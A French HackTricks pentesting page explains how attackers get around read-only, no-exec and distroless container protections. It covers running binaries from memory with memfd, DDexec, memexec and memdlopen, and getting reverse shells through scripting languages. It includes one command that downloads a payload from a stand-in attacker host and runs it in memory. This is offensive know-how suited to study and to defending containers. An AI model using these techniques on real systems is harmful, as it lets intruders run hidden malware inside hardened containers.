# Bypass FS protections: read-only / no-exec / Distroless

{{#include ../../../../banners/hacktricks-training.md}}

## Vidéos

Dans les vidéos suivantes, vous trouverez les techniques mentionnées sur cette page expliquées plus en détail :<sup>[[1]](#references)[[2]](#references)</sup>

- [**DEF CON 31 - Exploring Linux Memory Manipulation for Stealth and Evasion**](https://www.youtube.com/watch?v=poHirez8jk4)<sup>[[1]](#references)</sup>
- [**Stealth intrusions with DDexec-ng & in-memory dlopen() - HackTricks Track 2023**](https://www.youtube.com/watch?v=VM_gjjiARaU)<sup>[[2]](#references)</sup>

## Scénario read-only / no-exec

Il est de plus en plus courant de trouver des machines linux montées avec une **protection read-only (ro) du système de fichiers**, en particulier dans les containers. Cela s'explique par le fait qu'exécuter un container avec un système de fichiers ro est aussi simple que de définir **`readOnlyRootFilesystem: true`** dans le `securitycontext` :

<pre class="language-yaml"><code class="lang-yaml">apiVersion: v1
kind: Pod
metadata:
name: alpine-pod
spec:
containers:
- name: alpine
image: alpine
securityContext:
<strong>      readOnlyRootFilesystem: true
</strong>    command: ["sh", "-c", "while true; do sleep 1000; done"]
</code></pre>

Cependant, même si le système de fichiers est monté en ro, **`/dev/shm`** restera accessible en écriture. Il est donc faux de dire que nous ne pouvons rien écrire sur le disque. Toutefois, ce dossier sera **monté avec une protection no-exec**, donc si vous y téléchargez un binaire, vous **ne pourrez pas l'exécuter**.

> [!WARNING]
> Du point de vue d'une red team, cela rend **compliqué le téléchargement et l'exécution** de binaires qui ne sont pas déjà présents sur le système (comme des backdoors ou des enumerateurs tels que `kubectl`).

## Contournement le plus simple : Scripts

Notez que j'ai mentionné les binaires : vous pouvez **exécuter n'importe quel script** tant que l'interpréteur est présent sur la machine, comme un **shell script** si `sh` est présent, ou un **script** **python** si `python` est installé.

Cependant, cela ne suffit pas pour exécuter votre binary backdoor ou les autres binary tools dont vous pourriez avoir besoin.

## Contournements via la mémoire

Si vous souhaitez exécuter un binaire mais que le système de fichiers ne l'autorise pas, la meilleure solution consiste à **l'exécuter depuis la mémoire**, car les **protections ne s'y appliquent pas**.

### Contournement FD + exec syscall

Si vous disposez de puissants moteurs de script sur la machine, tels que **Python**, **Perl** ou **Ruby**, vous pouvez télécharger le binaire à exécuter depuis la mémoire, le stocker dans un descripteur de fichier mémoire (`create_memfd` syscall), qui ne sera pas soumis à ces protections, puis appeler un **`exec` syscall** en indiquant le **fd comme fichier à exécuter**.

Pour cela, vous pouvez utiliser facilement le projet [**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec). Vous pouvez lui transmettre un binaire et il générera un script dans le langage indiqué, contenant le **binaire compressé et encodé en b64**, ainsi que les instructions pour le **décoder et le décompresser** dans un **fd** créé en appelant le `create_memfd` syscall, puis un appel au **exec** syscall pour l'exécuter.

> [!WARNING]
> Cela ne fonctionne pas avec d'autres langages de script comme PHP ou Node, car ils ne disposent d'aucun moyen **par défaut d'appeler des raw syscalls** depuis un script. Il n'est donc pas possible d'appeler `create_memfd` pour créer le **memory fd** dans lequel stocker le binaire.
>
> De plus, la création d'un **fd classique** avec un fichier dans `/dev/shm` ne fonctionnera pas, car vous ne serez pas autorisé à l'exécuter : la **protection no-exec** s'appliquera.

### DDexec / EverythingExec

[**DDexec / EverythingExec**](https://github.com/arget13/DDexec) est une technique qui vous permet de **modifier la mémoire de votre propre processus** en écrasant son **`/proc/self/mem`**.

Ainsi, en **contrôlant le code assembleur** exécuté par le processus, vous pouvez écrire un **shellcode** et faire « muter » le processus pour **exécuter n'importe quel code arbitraire**.

> [!TIP]
> **DDexec / EverythingExec** vous permettra de charger et **d'exécuter** votre propre **shellcode** ou **n'importe quel binaire** depuis la **mémoire**.
```bash
# Basic example
wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo bar
```
Pour plus d'informations sur cette technique, consultez le Github ou :

{{#ref}}
ddexec.md
{{#endref}}

### MemExec

[**Memexec**](https://github.com/arget13/memexec) est l'étape naturelle suivante de DDexec. Il s'agit d'un **shellcode DDexec demonised** ; ainsi, chaque fois que vous souhaitez **exécuter un binaire différent**, vous n'avez pas besoin de relancer DDexec. Vous pouvez simplement exécuter le shellcode memexec via la technique DDexec, puis **communiquer avec ce deamon pour lui transmettre de nouveaux binaires à charger et à exécuter**.

Vous trouverez un exemple d'utilisation de **memexec pour exécuter des binaires depuis un reverse shell PHP** dans [https://github.com/arget13/memexec/blob/main/a.php](https://github.com/arget13/memexec/blob/main/a.php).

### Memdlopen

Avec un objectif similaire à DDexec, la technique [**memdlopen**](https://github.com/arget13/memdlopen) permet de **charger plus facilement des binaires** en mémoire afin de les exécuter ultérieurement. Elle peut même permettre de charger des binaires avec leurs dépendances.

## Bypass de Distroless

Pour une explication dédiée de **ce qu'est réellement distroless**, des situations où cela est utile ou non, et de la manière dont cela modifie les pratiques de post-exploitation dans les conteneurs, consultez :

{{#ref}}
../../../containers-namespaces/container-security/distroless.md
{{#endref}}

### Qu'est-ce que distroless

Les conteneurs distroless contiennent uniquement les **composants strictement nécessaires à l'exécution d'une application ou d'un service spécifique**, tels que les bibliothèques et les dépendances du runtime, mais excluent les composants plus volumineux comme un gestionnaire de paquets, un shell ou les utilitaires système.

L'objectif des conteneurs distroless est de **réduire la surface d'attaque des conteneurs en éliminant les composants inutiles** et en réduisant au minimum le nombre de vulnérabilités susceptibles d'être exploitées.

### Reverse Shell

Dans un conteneur distroless, vous pourriez **ne même pas trouver `sh` ou `bash`** pour obtenir un shell classique. Vous ne trouverez pas non plus de binaires tels que `ls`, `whoami`, `id`... ni tout ce que vous exécutez habituellement sur un système.

> [!WARNING]
> Vous ne pourrez donc **pas obtenir de **reverse shell** ni **énumérer** le système comme vous le faites habituellement.

Cependant, si le conteneur compromis exécute par exemple une application web Flask, Python est installé et vous pouvez donc obtenir un **Python reverse shell**. S'il exécute Node, vous pouvez obtenir un Node rev shell, et il en va de même pour la plupart des **langages de scripting**.

> [!TIP]
> Vous pouvez utiliser le langage de scripting pour **énumérer le système** grâce à ses fonctionnalités.

S'il n'existe **aucune protection `read-only/no-exec`**, vous pouvez exploiter votre reverse shell pour **écrire vos binaires dans le système de fichiers** et les **exécuter**.

> [!TIP]
> Cependant, dans ce type de conteneurs, ces protections seront généralement présentes, mais vous pouvez utiliser les **techniques précédentes d'exécution en mémoire pour les contourner**.

Vous trouverez des **exemples** expliquant comment **exploiter certaines vulnérabilités RCE** afin d'obtenir des **reverse shells** de langages de scripting et d'exécuter des binaires depuis la mémoire dans [**https://github.com/carlospolop/DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE).

## Références

- [1] [DEF CON 31 - Exploring Linux Memory Manipulation for Stealth and Evasion](https://www.youtube.com/watch?v=poHirez8jk4)
- [2] [Stealth intrusions with DDexec-ng & in-memory dlopen() - HackTricks Track 2023](https://www.youtube.com/watch?v=VM_gjjiARaU)

{{#include ../../../../banners/hacktricks-training.md}}
